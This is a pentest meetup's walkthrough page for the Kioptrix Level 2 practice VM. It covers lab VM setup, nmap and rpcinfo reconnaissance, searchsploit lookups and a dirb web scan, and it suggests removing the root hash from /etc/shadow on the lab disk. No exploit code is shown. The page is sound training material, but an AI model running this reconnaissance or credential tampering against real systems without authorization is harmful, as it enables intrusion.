

<!DOCTYPE html>
<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
<head>
  <meta charset="utf-8">
  
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <title>3.13. Kioptrix Level 2 &mdash; South Bay WASP 1.0.2 documentation</title>
  

  
  
  
  

  

  
  
    

  

  
  
    <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
  

  

  
        <link rel="index" title="Index"
              href="../genindex.html"/>
        <link rel="search" title="Search" href="../search.html"/>
    <link rel="top" title="South Bay WASP 1.0.2 documentation" href="../index.html"/>
        <link rel="up" title="3. Pentest Challenges" href="../pentest_challenges.html"/>
        <link rel="next" title="3.14. Kioptrix Level 1" href="kioptrix1.html"/>
        <link rel="prev" title="3.12. Kioptrix Level 3" href="kioptrix3.html"/> 

  
  <script src="../_static/js/modernizr.min.js"></script>

</head>

<body class="wy-body-for-nav" role="document">

   
  <div class="wy-grid-for-nav">

    
    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
      <div class="wy-side-scroll">
        <div class="wy-side-nav-search">
          

          
            <a href="../index.html" class="icon icon-home"> South Bay WASP
          

          
          </a>

          
            
            
              <div class="version">
                1.0
              </div>
            
          

          
<div role="search">
  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
    <input type="text" name="q" placeholder="Search docs" />
    <input type="hidden" name="check_keywords" value="yes" />
    <input type="hidden" name="area" value="default" />
  </form>
</div>

          
        </div>

        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
          
            
            
              
            
            
              <p class="caption"><span class="caption-text">Table of Contents</span></p>
<ul class="current">
<li class="toctree-l1"><a class="reference internal" href="../pentest_intro.html">1. South Bay WASP Meetup</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_kali.html">2. Kali Linux</a></li>
<li class="toctree-l1 current"><a class="reference internal" href="../pentest_challenges.html">3. Pentest Challenges</a><ul class="current">
<li class="toctree-l2"><a class="reference internal" href="virtual_machine_setup.html">3.1. Virtual Machine Setup</a></li>
<li class="toctree-l2"><a class="reference internal" href="owlnest.html">3.2. OwlNest</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice6.html">3.3. De-ICE Level 6</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice5.html">3.4. De-ICE Level 5</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice4.html">3.5. De-ICE Level 4</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice3.html">3.6. De-ICE Level 3</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice2.html">3.7. De-ICE Level 2</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice1.html">3.8. De-ICE Level 1</a></li>
<li class="toctree-l2"><a class="reference internal" href="underdist3.html">3.9. Underdist: 3</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix5.html">3.10. Kioptrix Level 5</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix4.html">3.11. Kioptrix Level 4</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix3.html">3.12. Kioptrix Level 3</a></li>
<li class="toctree-l2 current"><a class="current reference internal" href="#">3.13. Kioptrix Level 2</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#setup">3.13.1. Setup</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#setting-up-the-vmware-vm">3.13.1.1. Setting up the VMware VM</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#reconnaisance">3.13.2. Reconnaisance</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#directory-setup">3.13.2.1. Directory setup</a></li>
<li class="toctree-l4"><a class="reference internal" href="#id1">3.13.2.2. Reconnaisance</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#the-exploits">3.13.3. The Exploits</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#exploring-the-web-site">3.13.3.1. Exploring the web site</a></li>
<li class="toctree-l4"><a class="reference internal" href="#getting-a-reverse-bash-shell">3.13.3.2. Getting a reverse bash shell</a></li>
<li class="toctree-l4"><a class="reference internal" href="#getting-to-root-from-apache">3.13.3.3. Getting to root from apache</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix1.html">3.14. Kioptrix Level 1</a></li>
<li class="toctree-l2"><a class="reference internal" href="security_shepherd.html">3.15. Security Shepherd Web App Levels</a></li>
<li class="toctree-l2"><a class="reference internal" href="holynix2.html">3.16. Holynix2</a></li>
<li class="toctree-l2"><a class="reference internal" href="holynix1.html">3.17. Holynix1</a></li>
<li class="toctree-l2"><a class="reference internal" href="freshly.html">3.18. Freshly</a></li>
<li class="toctree-l2"><a class="reference internal" href="zorz.html">3.19. ZorZ</a></li>
<li class="toctree-l2"><a class="reference internal" href="vulnix.html">3.20. Vulnix</a></li>
<li class="toctree-l2"><a class="reference internal" href="googles_xss_game.html">3.21. Google’s XSS Game</a></li>
<li class="toctree-l2"><a class="reference internal" href="owning_database_with_sqlmap.html">3.22. Owning the Database with SQLMap</a></li>
<li class="toctree-l2"><a class="reference internal" href="from_sql_injection_to_shell_II.html">3.23. PentesterLab From SQL injection to Shell II</a></li>
<li class="toctree-l2"><a class="reference internal" href="from_sql_injection_to_shell.html">3.24. PentesterLab From SQL injection to Shell</a></li>
<li class="toctree-l2"><a class="reference internal" href="skytower1.html">3.25. SkyTower1</a></li>
<li class="toctree-l2"><a class="reference internal" href="nebula.html">3.26. Exploit Exercises Nebula</a></li>
<li class="toctree-l2"><a class="reference internal" href="natas.html">3.27. Natas</a></li>
<li class="toctree-l2"><a class="reference internal" href="try2hack.nl.html">3.28. try2hack.nl</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_encryption.html">4. Encryption</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_html.html">5. HTML</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_network_tools.html">6. Pentest Network Tools</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_recon.html">7. Pentest Reconnaisance</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_study.html">8. Pentest Study</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_buffer_overflow.html">9. Pentest Buffer Overflow</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_scripting.html">10. Pentest scripting</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_presentations.html">11. Pentest Presentations</a></li>
</ul>

            
          
        </div>
      </div>
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">

      
      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
        
          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
          <a href="../index.html">South Bay WASP</a>
        
      </nav>


      
      <div class="wy-nav-content">
        <div class="rst-content">
          















<div role="navigation" aria-label="breadcrumbs navigation">

  <ul class="wy-breadcrumbs">
    
      <li><a href="../index.html">Docs</a> &raquo;</li>
        
          <li><a href="../pentest_challenges.html">3. Pentest Challenges</a> &raquo;</li>
        
      <li>3.13. Kioptrix Level 2</li>
    
    
      <li class="wy-breadcrumbs-aside">
        
            
            <a href="../_sources/challenges/kioptrix2.rst.txt" rel="nofollow"> View page source</a>
          
        
      </li>
    
  </ul>

  
  <hr/>
</div>
          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
           <div itemprop="articleBody">
            
  <div class="section" id="kioptrix-level-2">
<span id="kioptrix2"></span><h1>3.13. Kioptrix Level 2<a class="headerlink" href="#kioptrix-level-2" title="Permalink to this headline">¶</a></h1>
<div class="section" id="setup">
<h2>3.13.1. Setup<a class="headerlink" href="#setup" title="Permalink to this headline">¶</a></h2>
<p>This is to document the meetup’s efforts responding to the challenge <a class="reference external" href="https://www.vulnhub.com/entry/kioptrix-level-1-1,22/">Vulnhub Kioptrix: Level 1.1 (#2)</a>, the second of the <a class="reference external" href="https://www.vulnhub.com/series/kioptrix,8/">Vulnhub Kioptrix Series</a>.</p>
<blockquote>
<div>This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.</div></blockquote>
<div class="section" id="setting-up-the-vmware-vm">
<h3>3.13.1.1. Setting up the VMware VM<a class="headerlink" href="#setting-up-the-vmware-vm" title="Permalink to this headline">¶</a></h3>
<p>The VM comes packaged as <a class="reference external" href="http://www.kioptrix.com/dlvm/Kioptrix_Level_2.rar">Kioptrix_Level_2.rar</a>, which is a rar archive containing a VMware vmdk file. If you have any setup troubles you can add the disk to an existing Linux VM, mount it, make a copy of <code class="file docutils literal"><span class="pre">/etc/shadow</span></code>, and delete the root password hash. This will provide passwordless access to Kioptrix2 via root.</p>
<p>See <a class="reference internal" href="virtual_machine_setup.html#vmsetup"><span class="std std-ref">Virtual Machine Setup</span></a> for background on using the VMware vmdk file. Kioptrix2 runs CentOS 4.X i686. Here’s how you can create a backing store to undo any changes to the disk:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">SUDO</span><span class="o">=</span><span class="k">$(</span>which sudo<span class="k">)</span>
<span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">&quot;</span> <span class="o">==</span> <span class="s2">&quot;root&quot;</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nv">SUDO</span><span class="o">=</span>
<span class="nv">VM</span><span class="o">=</span>kioptrix2
curl --remote-name http://www.kioptrix.com/dlvm/Kioptrix_Level_2.rar
<span class="nv">$SUDO</span> apt-get install unrar -y
<span class="nv">$SUDO</span> unrar e Kioptrix_Level_2.rar
<span class="nv">BACKING</span><span class="o">=</span><span class="s2">&quot;CentOs4.5.vmdk&quot;</span>
<span class="nv">VM_DISK</span><span class="o">=</span><span class="nv">$VM</span>-changes.qcow2
<span class="nv">$SUDO</span> qemu-img create -f qcow2 -o <span class="nv">backing_file</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$BACKING</span><span class="s2">&quot;</span>  <span class="nv">$VM_DISK</span>
<span class="nv">$SUDO</span> qemu-img info <span class="nv">$BACKING</span>
<span class="nv">$SUDO</span> qemu-img info <span class="nv">$VM_DISK</span>
<span class="c1"># To revert to original image</span>
<span class="c1"># BACKING=&quot;CentOs4.5.vmdk&quot;</span>
<span class="c1"># VM_DISK=$VM-changes.qcow2</span>
<span class="c1"># $SUDO qemu-img create -f qcow2 -o backing_file=$BACKING  $VM_DISK</span>
</pre></div>
</div>
<p>Then Linux KVM could use the VM_DISK to create the kioptrix2 VM. The actual command the author used in Debian Linux to create the VM was:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">VM</span><span class="o">=</span>kioptrix2
<span class="nv">$SUDO</span> virt-install <span class="se">\</span>
    --network<span class="o">=</span><span class="s2">&quot;bridge=br0&quot;</span> <span class="se">\</span>
    --name <span class="s2">&quot;</span><span class="nv">$VM</span><span class="s2">&quot;</span> --cpu host --vcpus <span class="m">1</span> --ram <span class="m">512</span> <span class="se">\</span>
    --os-type<span class="o">=</span>linux --os-variant<span class="o">=</span>rhel4 <span class="se">\</span>
    --disk <span class="nv">path</span><span class="o">=</span><span class="nv">$VM_DISK</span> <span class="se">\</span>
    --noautoconsole <span class="se">\</span>
    --accelerate --hvm <span class="se">\</span>
    --import
<span class="c1"># Useful commands:</span>
<span class="c1"># $SUDO virsh help</span>
<span class="c1"># $SUDO virsh list --all</span>
<span class="c1"># $SUDO virsh destroy --graceful $VM</span>
<span class="c1"># $SUDO virsh start $VM</span>
<span class="c1"># $SUDO virsh reboot $VM</span>
<span class="c1"># $SUDO virsh shutdown $VM</span>
<span class="c1"># $SUDO virsh undefine [--wipe-storage] $VM</span>
<span class="c1"># $SUDO virsh undefine $VM</span>
<span class="c1"># $SUDO virsh help destroy</span>
<span class="c1">#</span>
</pre></div>
</div>
<p>During the boot you’ll have to utilize kudzu hardware configuration: “Remove Configuration” for the PCnet LANCE and Intel Corporation 82371AB 82371AB/EB/MB PIIX4 IDE, then “Configure” the added RTL-8139/8139C/8139C+ NIC to use DHCP. You can “Ignore” the rest of the added devices.</p>
<p>If kioptrix were running and you wanted to “start over again”:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">SUDO</span><span class="o">=</span><span class="k">$(</span>which sudo<span class="k">)</span>
<span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">&quot;</span> <span class="o">==</span> <span class="s2">&quot;root&quot;</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nv">SUDO</span><span class="o">=</span>
<span class="nv">VM</span><span class="o">=</span>kioptrix2
<span class="nv">$SUDO</span> virsh shutdown <span class="nv">$VM</span>
<span class="nv">BACKING</span><span class="o">=</span><span class="s2">&quot;CentOs4.5.vmdk&quot;</span>
<span class="nv">VM_DISK</span><span class="o">=</span><span class="nv">$VM</span>-changes.qcow2
<span class="nv">$SUDO</span> qemu-img create -f qcow2 -o <span class="nv">backing_file</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$BACKING</span><span class="s2">&quot;</span>  <span class="nv">$VM_DISK</span>
<span class="nv">$SUDO</span> virsh start <span class="nv">$VM</span>
</pre></div>
</div>
</div>
</div>
<div class="section" id="reconnaisance">
<h2>3.13.2. Reconnaisance<a class="headerlink" href="#reconnaisance" title="Permalink to this headline">¶</a></h2>
<div class="section" id="directory-setup">
<h3>3.13.2.1. Directory setup<a class="headerlink" href="#directory-setup" title="Permalink to this headline">¶</a></h3>
<p>We’ll refer to the following directories below:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">BASE</span><span class="o">=</span><span class="nv">$HOME</span>/pentest
<span class="nv">PT</span><span class="o">=</span><span class="nv">$BASE</span>/kioptrix2
<span class="nv">TOOLS</span><span class="o">=</span>exploit,nmap,spider,sqlmap
<span class="nb">eval</span> mkdir -p <span class="nv">$PT</span>/<span class="o">{</span><span class="nv">$TOOLS</span><span class="o">}</span>
</pre></div>
</div>
</div>
<div class="section" id="id1">
<h3>3.13.2.2. Reconnaisance<a class="headerlink" href="#id1" title="Permalink to this headline">¶</a></h3>
<div class="section" id="network-reconnaissance">
<h4>3.13.2.2.1. Network reconnaissance<a class="headerlink" href="#network-reconnaissance" title="Permalink to this headline">¶</a></h4>
<p>Start with some standard network reconnaissance looking for the vulnerable host:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">SUDO</span><span class="o">=</span><span class="k">$(</span>which sudo<span class="k">)</span>
<span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">&quot;</span> <span class="o">==</span> <span class="s2">&quot;root&quot;</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nv">SUDO</span><span class="o">=</span>
<span class="nb">cd</span> <span class="nv">$PT</span>/nmap
<span class="nv">NMOUT</span><span class="o">=</span>nmap
<span class="nv">SN</span><span class="o">=</span><span class="s1">&#39;192.168.1.0/24&#39;</span>
<span class="nv">TARGETS</span><span class="o">=</span>targets.txt
<span class="nv">$SUDO</span> nmap -sn -PE -oA <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_sn <span class="nv">$SN</span>
<span class="nv">$SUDO</span> chown <span class="nv">$USER</span>.<span class="nv">$USER</span> <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_sn.*
<span class="c1"># use the grep-able output to get a list of target hosts</span>
grep Up <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_sn.gnmap <span class="p">|</span> cut -d<span class="s2">&quot; &quot;</span> -f2 &gt; <span class="nv">$TARGETS</span>
<span class="c1"># use the xml output to get an html report</span>
xsltproc <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_sn.xml -o <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_sn.html
</pre></div>
</div>
<p>Running this gives us:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/kioptrix2$ SUDO=$</span><span class="o">(</span>which sudo<span class="o">)</span>
<span class="gp">hacker@kali:~/pentest/kioptrix2$</span> <span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">&quot;</span> <span class="o">==</span> <span class="s2">&quot;root&quot;</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nv">SUDO</span><span class="o">=</span>
<span class="gp">hacker@kali:~/pentest/kioptrix2$ cd $</span>PT/nmap
<span class="gp">hacker@kali:~/pentest/kioptrix2/nmap$</span> <span class="nv">NMOUT</span><span class="o">=</span>nmap
<span class="gp">hacker@kali:~/pentest/kioptrix2/nmap$</span> <span class="nv">SN</span><span class="o">=</span><span class="s1">&#39;192.168.1.0/24&#39;</span>
<span class="gp">hacker@kali:~/pentest/kioptrix2/nmap$</span> <span class="nv">TARGETS</span><span class="o">=</span>targets.txt
<span class="gp">hacker@kali:~/pentest/kioptrix2/nmap$ $</span>SUDO nmap -sn -PE -oA <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_sn <span class="nv">$SN</span>
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="hll"><span class="go">Nmap scan report for 192.168.1.101</span>
</span><span class="hll"><span class="go">Host is up (0.00054s latency).</span>
</span><span class="hll"><span class="go">MAC Address: 52:54:00:94:E2:16 (QEMU Virtual NIC)</span>
</span><span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="gp">hacker@kali:~/pentest/kioptrix2/nmap$ $</span>SUDO chown <span class="nv">$USER</span>.<span class="nv">$USER</span> <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_sn.*
<span class="gp">hacker@kali:~/pentest/kioptrix2/nmap$ #</span> use the grep-able output to get a list of target hosts
<span class="gp">hacker@kali:~/pentest/kioptrix2/nmap$</span> grep Up <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_sn.gnmap <span class="p">|</span> cut -d<span class="s2">&quot; &quot;</span> -f2 &gt; <span class="nv">$TARGETS</span>
<span class="gp">hacker@kali:~/pentest/kioptrix2/nmap$ #</span> use the xml output to get an html report
<span class="gp">hacker@kali:~/pentest/kioptrix2/nmap$ xsltproc $</span><span class="o">{</span>NMOUT<span class="o">}</span>_sn.xml -o <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_sn.html
</pre></div>
</div>
<p>At this point we have our target host T=192.168.1.101:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.101
<span class="nv">$SUDO</span> nmap -A -vv -T3 --max-retries <span class="m">5</span> -Pn -oA <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_A <span class="nv">$T</span>
<span class="nv">$SUDO</span> chown <span class="nv">$USER</span>.<span class="nv">$USER</span> <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_A.*
xsltproc <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_A.xml -o <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_A.html
</pre></div>
</div>
<p>Running this gives us:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/pentest/kioptrix2/nmap$ $</span>SUDO nmap -A -vv -T3 --max-retries <span class="m">5</span> -Pn -oA <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_A <span class="nv">$T</span>
</span><span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="hll"><span class="go">Scanning 192.168.1.101 [1000 ports]</span>
</span><span class="hll"><span class="go">Discovered open port 3306/tcp on 192.168.1.101</span>
</span><span class="hll"><span class="go">Discovered open port 443/tcp on 192.168.1.101</span>
</span><span class="hll"><span class="go">Discovered open port 80/tcp on 192.168.1.101</span>
</span><span class="hll"><span class="go">Discovered open port 111/tcp on 192.168.1.101</span>
</span><span class="hll"><span class="go">Discovered open port 22/tcp on 192.168.1.101</span>
</span><span class="hll"><span class="go">Discovered open port 631/tcp on 192.168.1.101</span>
</span><span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="hll"><span class="go">PORT     STATE SERVICE  VERSION</span>
</span><span class="hll"><span class="go">22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)</span>
</span><span class="go">|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)</span>
<span class="go">|_sshv1: Server supports SSHv1</span>
<span class="hll"><span class="go">80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))</span>
</span><span class="hll"><span class="go">|_http-methods: No Allow or Public header in OPTIONS response (status code 200)</span>
</span><span class="hll"><span class="go">|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).</span>
</span><span class="hll"><span class="go">111/tcp  open  rpcbind  2 (RPC #100000)</span>
</span><span class="hll"><span class="go">| rpcinfo:</span>
</span><span class="hll"><span class="go">|   program version   port/proto  service</span>
</span><span class="hll"><span class="go">|   100000  2            111/tcp  rpcbind</span>
</span><span class="hll"><span class="go">|   100000  2            111/udp  rpcbind</span>
</span><span class="hll"><span class="go">|   100024  1            733/udp  status</span>
</span><span class="hll"><span class="go">|_  100024  1            736/tcp  status</span>
</span><span class="hll"><span class="go">443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))</span>
</span><span class="go">|_http-methods: No Allow or Public header in OPTIONS response (status code 200)</span>
<span class="go">|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).</span>
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="hll"><span class="go">631/tcp  open  ipp      CUPS 1.1</span>
</span><span class="hll"><span class="go">| http-methods: GET HEAD OPTIONS POST PUT</span>
</span><span class="hll"><span class="go">| Potentially risky methods: PUT</span>
</span><span class="hll"><span class="go">|_See http://nmap.org/nsedoc/scripts/http-methods.html</span>
</span><span class="hll"><span class="go">|_http-title: 403 Forbidden</span>
</span><span class="hll"><span class="go">3306/tcp open  mysql    MySQL (unauthorized)</span>
</span><span class="hll"><span class="go">MAC Address: 52:54:00:94:E2:16 (QEMU Virtual NIC)</span>
</span><span class="hll"><span class="go">Device type: general purpose</span>
</span><span class="hll"><span class="go">Running: Linux 2.6.X</span>
</span><span class="hll"><span class="go">OS CPE: cpe:/o:linux:linux_kernel:2.6</span>
</span><span class="hll"><span class="go">OS details: Linux 2.6.9 - 2.6.30</span>
</span><span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="hll"><span class="gp">hacker@kali:~/pentest/kioptrix2/nmap$ $</span>SUDO chown <span class="nv">$USER</span>.<span class="nv">$USER</span> <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_A.*
</span><span class="hll"><span class="gp">hacker@kali:~/pentest/kioptrix2/nmap$ xsltproc $</span><span class="o">{</span>NMOUT<span class="o">}</span>_A.xml -o <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_A.html
</span></pre></div>
</div>
</div>
<div class="section" id="exposed-services">
<h4>3.13.2.2.2. Exposed services<a class="headerlink" href="#exposed-services" title="Permalink to this headline">¶</a></h4>
<p>Our target kioptrix2 is T=192.168.1.101 and runs:</p>
<div class="section" id="port-22-openssh-3-9p1-protocol-1-99">
<h5>3.13.2.2.2.1. port 22: OpenSSH 3.9p1 (protocol 1.99)<a class="headerlink" href="#port-22-openssh-3-9p1-protocol-1-99" title="Permalink to this headline">¶</a></h5>
<p>A <strong class="program">searchsploit</strong> run showed:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/kioptrix2/exploit$</span> searchsploit openssh
<span class="go">--------------------------------------------- ----------------------------------</span>
<span class="go"> Description                                 |  Path</span>
<span class="go">--------------------------------------------- ----------------------------------</span>
<span class="go">OpenSSH/PAM &lt;= 3.6.1p1 - Remote Users Discov | /linux/remote/25.c</span>
<span class="go">OpenSSH/PAM &lt;= 3.6.1p1 - Remote Users Ident  | /linux/remote/26.sh</span>
<span class="go">glibc-2.2 and openssh-2.3.0p1 Exploits glibc | /linux/local/258.sh</span>
<span class="go">Dropbear / OpenSSH Server (MAX_UNAUTH_CLIENT | /multiple/dos/1572.pl</span>
<span class="go">OpenSSH &lt;= 4.3 p1 (Duplicated Block) Remote  | /multiple/dos/2444.sh</span>
<span class="go">Portable OpenSSH &lt;= 3.6.1p-PAM / 4.1-SUSE Ti | /multiple/remote/3303.sh</span>
<span class="go">Debian OpenSSH Remote SELinux Privilege Elev | /linux/remote/6094.txt</span>
<span class="go">Novell Netware 6.5 - OpenSSH Remote Stack Ov | /novell/dos/14866.txt</span>
<span class="go">FreeBSD OpenSSH 3.5p1 - Remote Root Exploit  | /freebsd/remote/17462.txt</span>
<span class="go">OpenSSH 1.2 scp File Create/Overwrite Vulner | /linux/remote/20253.sh</span>
<span class="go">OpenSSH 2.x/3.0.1/3.0.2 Channel Code Off-By- | /unix/remote/21314.txt</span>
<span class="go">OpenSSH 2.x/3.x Kerberos 4 TGT/AFS Token Buf | /linux/remote/21402.txt</span>
<span class="go">OpenSSH 3.x Challenge-Response Buffer Overfl | /unix/remote/21578.txt</span>
<span class="go">OpenSSH 3.x Challenge-Response Buffer Overfl | /unix/remote/21579.txt</span>
<span class="go">--------------------------------------------- ----------------------------------</span>
</pre></div>
</div>
<p>None of these applied to the target OpenSSH version.</p>
</div>
<div class="section" id="ports-80-443-apache-httpd-2-0-52-centos">
<h5>3.13.2.2.2.2. ports 80, 443: Apache httpd 2.0.52 ((CentOS))<a class="headerlink" href="#ports-80-443-apache-httpd-2-0-52-centos" title="Permalink to this headline">¶</a></h5>
<p>kioptrix2 runs Apache httpd 2.0.52 ((CentOS)) which <a class="reference external" href="http://vault.centos.org/4.0/os/i386/CentOS/RPMS/">vault.centos.org/4.0</a> indicates is CentOS 4.x with the 2.6.9 kernel. We’ll delay a vulnerability search for the detailed port 80 &amp; 443 reconnaissance.</p>
</div>
<div class="section" id="ports-111-733-736-rpcbind-statd">
<h5>3.13.2.2.2.3. ports 111, 733, 736: rpcbind, statd<a class="headerlink" href="#ports-111-733-736-rpcbind-statd" title="Permalink to this headline">¶</a></h5>
<p>Run <code class="docutils literal"><span class="pre">rpcinfo</span> <span class="pre">-p</span> <span class="pre">$T</span></code> to scan port 111:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/kioptrix2/nmap$</span> <span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.101
<span class="hll"><span class="gp">hacker@kali:~/pentest/kioptrix2/nmap$</span> rpcinfo -p <span class="nv">$T</span>
</span><span class="go">   program vers proto   port</span>
<span class="hll"><span class="go">    100000    2   tcp    111  portmapper</span>
</span><span class="hll"><span class="go">    100000    2   udp    111  portmapper</span>
</span><span class="hll"><span class="go">    100024    1   udp    733  status</span>
</span><span class="hll"><span class="go">    100024    1   tcp    736  status</span>
</span></pre></div>
</div>
</div>
<div class="section" id="port-631-ipp-cups-1-1">
<h5>3.13.2.2.2.4. port 631: ipp CUPS 1.1<a class="headerlink" href="#port-631-ipp-cups-1-1" title="Permalink to this headline">¶</a></h5>
<p>A quick search for vulnerabilites didn’t reveal any remote vulnerability available without credentials.</p>
</div>
<div class="section" id="port-3306-mysql">
<h5>3.13.2.2.2.5. port 3306: mysql<a class="headerlink" href="#port-3306-mysql" title="Permalink to this headline">¶</a></h5>
<p>Given CentOS 4.x the MySQL version from <a class="reference external" href="http://vault.centos.org/4.0/os/i386/CentOS/RPMS/">vault.centos.org/4.0</a> should be 4.1.7 (CentOS 4.0) - 4.1.22 (CentOS 4.9). Trying to connect directly to mysql got this error:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/kioptrix2/exploit$</span> mysql -h <span class="nv">$T</span> -u root
<span class="go">ERROR 1130 (HY000): Host &#39;192.168.1.104&#39; is not allowed to connect to this MySQL server</span>
</pre></div>
</div>
<p>We’ll delay mysql analysis until after port 80 &amp; 443 reconnaissance.</p>
</div>
</div>
<div class="section" id="reconnaisance-on-ports-80-443">
<h4>3.13.2.2.3. Reconnaisance on ports 80 &amp; 443<a class="headerlink" href="#reconnaisance-on-ports-80-443" title="Permalink to this headline">¶</a></h4>
<div class="section" id="dirb">
<h5>3.13.2.2.3.1. dirb<a class="headerlink" href="#dirb" title="Permalink to this headline">¶</a></h5>
<p>First scan the web server with <strong class="program">dirb</strong>:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.101
<span class="nb">cd</span> <span class="nv">$PT</span>/spider
dirb  http://<span class="nv">$T</span>/ -o dirb.txt
</pre></div>
</div>
<p>The results of the scan were:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/kioptrix2/spider$</span> <span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.101
<span class="gp">hacker@kali:~/pentest/kioptrix2/spider$ cd $</span>PT/spider
<span class="gp">hacker@kali:~/pentest/kioptrix2/spider$</span> dirb  http://<span class="nv">$T</span>/ -o dirb.txt
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="go">---- Scanning URL: http://192.168.1.101/ ----</span>
<span class="go">+ http://192.168.1.101/cgi-bin/ (CODE:403|SIZE:289)</span>
<span class="go">+ http://192.168.1.101/index.php (CODE:200|SIZE:667)</span>
<span class="go">==&gt; DIRECTORY: http://192.168.1.101/manual/</span>
<span class="go">+ http://192.168.1.101/usage (CODE:403|SIZE:286)</span>
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
</pre></div>
</div>
</div>
